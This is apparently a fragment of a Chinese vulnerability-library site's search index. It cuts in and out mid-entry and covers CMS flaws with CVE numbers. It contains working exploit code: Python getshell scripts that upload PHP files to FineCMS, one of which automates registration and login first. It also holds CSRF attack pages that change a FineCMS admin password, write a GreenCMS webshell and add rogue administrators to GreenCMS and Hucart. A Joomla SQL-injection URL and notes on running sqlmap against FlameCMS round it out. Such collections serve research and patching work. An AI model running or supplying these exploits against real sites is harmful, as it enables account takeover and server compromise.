Python\u6279\u91cfpoc\u811a\u672c","text":"<p>pocsuite\u548cpoc-T\u662f\u4e24\u4e2a\u6210\u719f\u7684poc\u6846\u67b6\uff0c\u4e0d\u8fc7\u611f\u89c9\u6838\u5fc3\u4ee3\u7801\u662f\u522b\u4eba\u7684\uff0c\u53ea\u5199\u4e00\u4e9bpoc\u63d2\u4ef6\u7684\u8bdd\uff0c\u5c31\u662f\u4e3a\u522b\u4eba\u9020\u8f6e\u5b50\uff0c\u6240\u4ee5\u62bd\u4e86\u4e00\u4e9b\u4ee3\u7801\u5199\u4e86\u4e2a\u81ea\u5df1\u7684\u5de5\u5177\uff0c\u53ef\u80fd\u8fde\u8f7b\u578b\u6846\u67b6\u90fd\u7b97\u4e0d\u4e0a\uff0c\u53ea\u591f\u81ea\u5df1\u7528\u7684\u3002 \u7b2c\u4e00\u5904getshell\u7684python\u4ee3\u7801\uff08\u56e0\u4e3a\u662f\u76f4\u63a5getshell\uff0c\u65e0\u9700\u767b\u5f55\uff0c\u6240\u4ee5\u5f88\u7b80\u5355\uff09\uff1a</p> <pre><code>import sys\nimport requests\ndef poc(target):\n    payload=\"/index.php?c=api&amp;m=data2&amp;auth=50ce0d2401ce4802751739552c8e4467&amp;param=update_avatar&amp;file=data:image/php;base64,PD9waHAgcGhwaW5mbygpOz8+\"\n    url=target+payload\n    shell=target+'/uploadfile/member/0/0x0.php'\n    try:\n        result=requests.get(url,timeout=3)\n        verify=requests.get(shell,timeout=3)\n        if verify.status_code==200 and 'code' in verify.text:\n            return True\n    except Exception,e:\n        print e\n</code></pre> <p>\u7b2c\u4e8c\u5904getshell\u7684Python\u4ee3\u7801\uff08\u9700\u8981\u81ea\u52a8\u5316\u6ce8\u518c\u3001\u767b\u5f55\u3001\u5229\u7528\uff09\uff1a</p> <pre><code>#Finecms version:5.0.8\n#Author:404notfound\n\nimport random\nimport sys\nimport requests\ndef poc(url):\n    username=random.randint(0,999999)\n    seed = \"1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n    email = []\n    for i in range(8):\n        email.append(random.choice(seed))\n    email = ''.join(email)\n    #print email+\"@\"+email+\".com\"\n    #print username\n\n    #step 1 register\n    #print \"[+] register user\"\n    register_url=url+\"/index.php?s=member&amp;c=register&amp;m=index\"\n    register_payload={\"back\":\"\",\"data[username]\":username,\"data[password]\":\"123456\",\"data[password2]\":\"123456\",\"data[email]\":email+\"@\"+email+\".com\"}\n    #step 2 login\n    #print \"[+] user login\"\n    login_url=url+\"/index.php?s=member&amp;c=login&amp;m=index\"\n    login_payload={\"back\":\"\",\"data[username]\":username,\"data[password]\":\"123456\",\"data[auto]\":\"1\"}\n    #step 3 attack\n    #print \"[+] loading payload\"\n    vul_url=url+\"/index.php?s=member&amp;c=account&amp;m=upload\"\n    vul_payload={\"tx\":\"data:image/php;base64,NDA0bm90Zm91bmQ8P3BocCBwaHBpbmZvKCk7Pz4=\"}\n    try:\n        s = requests.session()\n        resu=s.post(register_url,data=register_payload)\n        result=s.post(login_url,data=login_payload)\n        result2=s.post(vul_url,data=vul_payload).content\n        if \"status\" in result2:\n            return True\n        else:\n            return False\n    except Exception,e:\n        pass\n        #print e\n    #print \"[+] ALL DONE\"\n    #step 4 find shell path\n\n#print poc(\"http://localhost\")\n</code></pre> <p>get\u811a\u672cgithub\u8bbf\u95ee\u83b7\u53d6</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/FineCMS/Finecms_v5.4%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81/","title":"Finecms v5.4\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u4fee\u6539\u7ba1\u7406\u5458\u8d26\u6237\u5bc6\u7801","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/FineCMS/Finecms_v5.4%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Finecms_v5.4\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u4fee\u6539\u7ba1\u7406\u5458\u8d26\u6237\u5bc6\u7801 2018-10-07 \u8e0f\u6708\u7559\u9999 http://www.finecms.net/ http://down.chinaz.com/soft/32596.htm 5.4 CVE-2018-18191"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/FineCMS/Finecms_v5.4%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>\u6076\u610f\u653b\u51fb\u8005\u53ef\u4ee5\u7cbe\u5fc3\u4f2a\u9020\u4e00\u4e2ahtml\u9875\u9762\u8bf1\u9a97\u5df2\u767b\u5f55\u7684\u7ba1\u7406\u7528\u6237\u70b9\u51fb\uff0c\u4ece\u800c\u66f4\u6539\u7ba1\u7406\u5458\u8d26\u6237\u5bc6\u7801\u3002   </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/FineCMS/Finecms_v5.4%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>exp\u4ee3\u7801\u5982\u4e0b\uff1a  </p> <pre><code>&lt;html&gt;\n  &lt;body&gt;\n  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;\n    &lt;form action=\"http://127.0.0.1/admin.php?c=member&amp;m=edit&amp;uid=1\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"page\" value=\"0\" /&gt;\n      &lt;input type=\"hidden\" name=\"member&amp;#91;email&amp;#93;\" value=\"admin&amp;#64;163&amp;#46;com\" /&gt;\n      &lt;input type=\"hidden\" name=\"member&amp;#91;name&amp;#93;\" value=\"admin\" /&gt;\n      &lt;input type=\"hidden\" name=\"member&amp;#91;phone&amp;#93;\" value=\"18888888888\" /&gt;\n      &lt;input type=\"hidden\" name=\"member&amp;#91;password&amp;#93;\" value=\"888888\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/FlameCMS/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"CVE 2019 16309 FlameCMS 3.3.5 \u540e\u53f0\u767b\u5f55\u5904\u5b58\u5728sql\u6ce8\u5165\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/FlameCMS/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","title":"\u524d\u8a00","text":"<p>CVE-2019-16309 FlameCMS 3.3.5 \u540e\u53f0\u767b\u5f55\u5904\u5b58\u5728sql\u6ce8\u5165\u6f0f\u6d1e</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/FlameCMS/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_2","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"<p>Ethan\u53d1\u73b0FlameCMS 3.3.5 \u540e\u53f0\u767b\u5f55\u5904\u5b58\u5728sql\u6ce8\u5165\u6f0f\u6d1e</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/FlameCMS/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_3","title":"\u6f0f\u6d1e\u5371\u5bb3","text":"<p>\u540e\u53f0\u767b\u5f55\u5904\u5b58\u5728sql\u6ce8\u5165\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u901a\u8fc7<code>sqlmap</code>\u76f4\u63a5\u8dd1\u51fa\u6240\u6709\u8868</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/FlameCMS/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_4","title":"\u5f71\u54cd\u8303\u56f4","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/FlameCMS/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_5","title":"\u4ea7\u54c1","text":"<p>FlameCMS</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/FlameCMS/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_6","title":"\u7248\u672c","text":"<p>FlameCMS 3.3.5 \u7248\u672c  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/FlameCMS/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_7","title":"\u7ec4\u4ef6","text":"<p>FlameCMS  </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/FlameCMS/CVE-2019-16309%20FlameCMS%203.3.5%20%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E5%A4%84%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_8","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u8bbf\u95ee\u540e\u53f0\u767b\u9646\u5904\u6293\u5305<code>http://127.0.0.1:8888/FlameCMS-master/account/login.php</code></p> <p>\u7136\u540e\u628a\u6293\u53d6\u7684post\u5305\uff0c\u653e\u8fdbsqlmap\u8dd1\uff0c\u53ef\u4ee5\u8dd1\u51fa\u76f2\u6ce8</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/GreenCMS/GreenCMS%20v2.3.0603%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%8E%B7%E5%8F%96webshell%26%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/","title":"GreenCMS v2.3.0603\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u83b7\u53d6webshell&\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/GreenCMS/GreenCMS%20v2.3.0603%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%8E%B7%E5%8F%96webshell%26%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 GreenCMS v2.3.0603\u5b58\u5728CSRF\u6f0f\u6d1e\u53ef\u83b7\u53d6webshell&amp;\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u6237 2018-06-02 \u60dc\u6f6e https://github.com/GreenCMS/GreenCMS https://github.com/GreenCMS/GreenCMS v2.3.0603 CVE-2018-11670/CVE-2018-11671"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/GreenCMS/GreenCMS%20v2.3.0603%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%8E%B7%E5%8F%96webshell%26%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>\u6076\u610f\u653b\u51fb\u8005\u53ef\u4ee5\u7cbe\u5fc3\u4f2a\u9020\u4e00\u4e2aHtml\u9875\u9762 \u4ece\u800c\u83b7\u53d6\u7f51\u7ad9webshell\u3002GreenCMS\u662f\u4e00\u4e2a\u5728github\u4e0a\u5f00\u6e90\u7684CMS\u7cfb\u7edf\uff0c\u6f0f\u6d1e\u53d1\u73b0\u8005\u5df2\u7ecf\u5c06\u6f0f\u6d1e\u4fe1\u606f\u901a\u8fc7issues/issues\u544a\u77e5\u4f5c\u8005\u3002   </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/GreenCMS/GreenCMS%20v2.3.0603%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E8%8E%B7%E5%8F%96webshell%26%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>\u4eceCSRF\u5230get webshell \u7684exp\u4ee3\u7801\u5982\u4e0b\uff1a  </p> <pre><code>&lt;span style=\"font-size:18px;\"&gt;&lt;!DOCTYPE html&gt; \n&lt;html lang=\"en\"&gt; \n&lt;head&gt; \n    &lt;meta charset=\"UTF-8\"&gt; \n    &lt;title&gt;csrf\u6d4b\u8bd5&lt;/title&gt; \n&lt;/head&gt; \n&lt;form action=\"http://127.0.0.1//14/index.php?m=admin&amp;c=media&amp;a=fileconnect\" method=\"POST\" id=\"transfer\" name=\"transfer\"&gt;\n    &lt;!-- \u4e0b\u9762\u7684\u662f\u751f\u6210\u6587\u4ef6\u540d\u4e3axc.php\u7684\u811a\u672c\u6587\u4ef6 \u8def\u5f84 127.0.0.1/Upload/xc.php --&gt;\n    &lt;script src=\"http://127.0.0.1/14/index.php?m=admin&amp;c=media&amp;a=fileconnect&amp;cmd=mkfile&amp;name=xc.php&amp;target=l1_XA&amp;_=1527839615462\"&gt;&lt;/script&gt;\n    &lt;input type=\"hidden\" name=\"cmd\" value=\"put\"&gt;\n    &lt;input type=\"hidden\" name=\"target\" value=\"l1_eGMucGhw\"&gt;\n\u3000    &lt;input type=\"hidden\" name=\"content\" value=\"&lt;?php phpinfo();?&gt;\"&gt;\n    &lt;!-- \u4e0b\u9762\u7684\u662f\u63d0\u4ea4\u8868\u5355 \u5c06content\u4e2d\u7684\u547d\u4ee4\u5199\u5165\u811a\u672c\u5185 --&gt;\n    &lt;button type=\"submit\" value=\"Submit\"&gt;WebShell&lt;/button&gt;\n    &lt;/form&gt;\n    &lt;/body&gt;\n&lt;/html&gt;&lt;/span&gt;\n</code></pre> <p>\u4eceCSRF\u5230\u589e\u52a0\u7ba1\u7406\u5458 \u7684exp\u4ee3\u7801\u5982\u4e0b\uff1a  </p> <pre><code>&lt;span style=\"font-size:18px;\"&gt;&lt;!DOCTYPE html&gt;  \n&lt;html lang=\"en\"&gt;  \n&lt;head&gt;  \n    &lt;meta charset=\"UTF-8\"&gt;  \n    &lt;title&gt;csrf\u6d4b\u8bd5&lt;/title&gt;  \n&lt;/head&gt;  \n\u3000\u3000&lt;body&gt;  \n    \u3000\u3000\u3000\u3000&lt;form action=\"http://127.0.0.1//14/index.php?m=admin&amp;c=access&amp;a=adduserhandle\" method=\"POST\" id=\"transfer\" name=\"transfer\"&gt;  \n\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000&lt;input type=\"hidden\" name=\"user_id0\" value=\"1\"&gt;  \n\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000&lt;input type=\"hidden\" name=\"user_login\" value=\"test1\"&gt;  &lt;!--\u5728\u8fd9\u91cc\u53ef\u4ee5\u6dfb\u52a0JS\u811a\u672c\u7528\u4e8e\u83b7\u53d6cookies  csrf+xss--&gt;\n\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000&lt;input type=\"hidden\" name=\"password\" value=\"test1\"&gt;  \n\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000&lt;input type=\"hidden\" name=\"rpassword\" value=\"test1\"&gt;  \n\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000&lt;input type=\"hidden\" name=\"user_nicename\" value=\"123\"&gt;  \n\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000&lt;input type=\"hidden\" name=\"user_email\" value=\"123%40Qq.com\"&gt;  \n\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000&lt;input type=\"hidden\" name=\"user_url\" value=\"www.baidu.com\"&gt;  \n\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000&lt;input type=\"hidden\" name=\"user_intro\" value=\"test\"&gt;  \n\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000&lt;input type=\"hidden\" name=\"user_status\" value=\"1\"&gt;  \n\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000&lt;input type=\"hidden\" name=\"role_id\" value=\"1\"&gt;\n        &lt;button type=\"submit\" value=\"Submit\"&gt;\u6dfb\u52a0\u7ba1\u7406\u5458&lt;/button&gt;  \n\u3000\u3000\u3000\u3000\u3000\u3000&lt;/form&gt;  \n    &lt;/body&gt;\n&lt;/html&gt;&lt;/span&gt;\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/GreenCMS/GreenCMS%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/","title":"GreenCMS \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\u6f0f\u6d1e","text":"","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/GreenCMS/GreenCMS%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#_1","title":"\u6f0f\u6d1e\u5f71\u54cd","text":"<p>GreenCMS v2.3.0603\u53ca\u4ee5\u4e0b\u7248\u672c</p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/GreenCMS/GreenCMS%20%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/#poc","title":"\u6f0f\u6d1ePOC","text":"<p>POC </p>","tags":["\u767d\u9601-\u6f0f\u6d1e\u5e93"]},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/HucartCMS/Hucart%20cms%20v5.7.4%20CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BB%BB%E6%84%8F%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7/","title":"Hucart cms v5.7.4 CSRF\u6f0f\u6d1e\u53ef\u4efb\u610f\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u53f7","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/HucartCMS/Hucart%20cms%20v5.7.4%20CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BB%BB%E6%84%8F%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7/#_1","title":"\u6f0f\u6d1e\u7b80\u4ecb","text":"\u6f0f\u6d1e\u540d\u79f0 \u4e0a\u62a5\u65e5\u671f \u6f0f\u6d1e\u53d1\u73b0\u8005 \u4ea7\u54c1\u9996\u9875 \u8f6f\u4ef6\u94fe\u63a5 \u7248\u672c CVE\u7f16\u53f7 Hucart cms v5.7.4 CSRF\u6f0f\u6d1e\u53ef\u4efb\u610f\u589e\u52a0\u7ba1\u7406\u5458\u8d26\u53f7 2019-01-13 AllenChen\uff08520allen@gmail.com\uff09 http://www.hucart.com/ http://www.hucart.com/ v5.7.4 CVE-2019-6249"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/HucartCMS/Hucart%20cms%20v5.7.4%20CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BB%BB%E6%84%8F%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7/#_2","title":"\u6f0f\u6d1e\u6982\u8ff0","text":"<p>Hucart cms v5.7.4\u7248\u672c\u5b58\u5728\u4e00\u4e2aCSRF\u6f0f\u6d1e\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u9646\u540e\u8bbf\u95ee\u4e0b\u9762CSRF\u6d4b\u8bd5\u9875\u9762\u53ef\u589e\u52a0\u4e00\u4e2a\u540d\u4e3ahack\u7684\u7ba1\u7406\u5458\u8d26\u53f7\u3002   </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/HucartCMS/Hucart%20cms%20v5.7.4%20CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E4%BB%BB%E6%84%8F%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7/#poc","title":"POC\u5b9e\u73b0\u4ee3\u7801\u5982\u4e0b\uff1a","text":"<p>exp\u4ee3\u7801\u5982\u4e0b\uff1a \u589e\u52a0\u4e00\u4e2a\u540d\u4e3ahack\u5bc6\u7801\u4e3ahack123\u7684\u7ba1\u7406\u5458\u8d26\u53f7\u3002</p> <pre><code>&lt;html&gt;&lt;body&gt;\n&lt;script type=\"text/javascript\"&gt;\nfunction post(url,fields)\n{\nvar p = document.createElement(\"form\");\np.action = url;\np.innerHTML = fields;\np.target = \"_self\";\np.method = \"post\";\ndocument.body.appendChild(p);\np.submit();\n}\nfunction csrf_hack()\n{\nvar fields;\n\nfields += \"&lt;input type='hidden' name='adm_user' value='hack' /&gt;\";\nfields += \"&lt;input type='hidden' name='adm_email' value='admin@hack.com' /&gt;\";  \nfields += \"&lt;input type='hidden' name='adm_mobile' value='13888888888' /&gt;\";  \nfields += \"&lt;input type='hidden' name='adm_pwd' value='hack123' /&gt;\";  \nfields += \"&lt;input type='hidden' name='re_adm_pwd' value='hack123' /&gt;\";  \nfields += \"&lt;input type='hidden' name='adm_enabled' value='1' /&gt;\";  \nfields += \"&lt;input type='hidden' name='act_type' value='add' /&gt;\";  \nfields += \"&lt;input type='hidden' name='adm_id' value='' /&gt;\";  \n\nvar url = \"http://localhost/hucart_cn/adminsys/index.php?load=admins&amp;act=edit_info&amp;act_type=add\";\npost(url,fields);\n}\nwindow.onload = function() { csrf_hack();}\n&lt;/script&gt;\n&lt;/body&gt;&lt;/html&gt;\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/%28CVE-2016-8869%29Joomla_3.4.4-3.6.3_%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%89%B9%E6%9D%83%E7%94%A8%E6%88%B7/","title":"Joomla_3.4.4-3.6.3_\u672a\u6388\u6743\u521b\u5efa\u7279\u6743\u7528\u6237(CVE-2016-8869)","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/%28CVE-2016-8869%29Joomla_3.4.4-3.6.3_%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%89%B9%E6%9D%83%E7%94%A8%E6%88%B7/#affected-version","title":"Affected Version","text":"<p>Joomla! 3.4.4 - 3.6.3</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/%28CVE-2016-8869%29Joomla_3.4.4-3.6.3_%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%89%B9%E6%9D%83%E7%94%A8%E6%88%B7/#poc","title":"PoC","text":"<p>\u6ce8\u610f\uff1a \u7531\u4e8e\u9ed8\u8ba4\u5173\u95ed\u6ce8\u518c\u529f\u80fd\uff0c\u6240\u4ee5\u5bfc\u81f4\u521b\u5efa\u7684\u7ba1\u7406\u5458\u7528\u6237\u672a\u6fc0\u6d3b\u65e0\u6cd5\u4f7f\u7528\u3002</p> <p>\u6d4b\u8bd5\uff1a </p> <p>\u767b\u5f55\u540e\u53f0\u786e\u8ba4\u7528\u6237\u4e2d\u589e\u52a0\u4e86 Administrator \u7684\u4e00\u4e2a\u7528\u6237\uff1a </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/%28CVE-2016-8869%29Joomla_3.4.4-3.6.3_%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%9B%E5%BB%BA%E7%89%B9%E6%9D%83%E7%94%A8%E6%88%B7/#references","title":"References","text":"<ol> <li> <p>http://blog.knownsec.com/2016/10/joomla-register-cve-2016-8869/</p> </li> <li> <p>https://github.com/sunsunza2009/Joomla-3.4.4-3.6.4_CVE-2016-8869_and_CVE-2016-8870</p> </li> </ol>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/%28CVE-2017-8917%29Joomla%203.7.0%20%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"Joomla 3.7.0  SQL\u6ce8\u5165\u6f0f\u6d1eCVE-2017-8917","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/%28CVE-2017-8917%29Joomla%203.7.0%20%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","title":"\u7b80\u4ecb","text":"<p>\u6f0f\u6d1e\u662f\u7531\u6b64Joomla 3.7.0 \u7248\u672c\u4e2d\u5f15\u5165\u7684\u65b0\u7ec4\u4ef6\uff08com_fields\uff09\u5e26\u6765\u7684</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Joomla/%28CVE-2017-8917%29Joomla%203.7.0%20%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_2","title":"\u73af\u5883\u642d\u5efa","text":"<p>cd /root/vulhub/joomla/CVE-2017-8917 docker-compose up -d  </p> <p>\u542f\u52a8\u540e\u8bbf\u95eehttp://your-ip:8080\u5373\u53ef\u770b\u5230Joomla\u7684\u5b89\u88c5\u754c\u9762 \u6309\u7167\u987a\u5e8f\u5b89\u88c5\u5373\u53ef \u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u8bbf\u95eehttp://your-ip:8080/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,user()),1)\uff0c\u5373\u53ef\u770b\u5230\u62a5\u9519\u4fe1\u606f\uff1a 